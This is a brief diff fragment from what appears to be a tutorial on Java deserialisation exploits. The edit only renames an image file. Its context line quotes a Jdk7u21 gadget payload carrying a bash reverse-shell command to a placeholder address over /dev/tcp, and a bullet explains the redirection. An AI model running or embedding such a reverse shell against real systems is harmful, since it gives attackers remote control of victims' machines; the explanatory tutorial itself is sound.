@@ -225,6 +225,6 @@ Jdk7u21 "/bin/bash -c /bin/bash${IFS}-i>&/dev/tcp/ipaddress/1337<&1"
 * 0>&1 - Takes standard output, and connects it to standard input.
 
 <p align="center">
-  <img src="/images/deserialisation/desc24.png">
+  <img src="/images/deserialisation/descc24.png">
 </p>
 
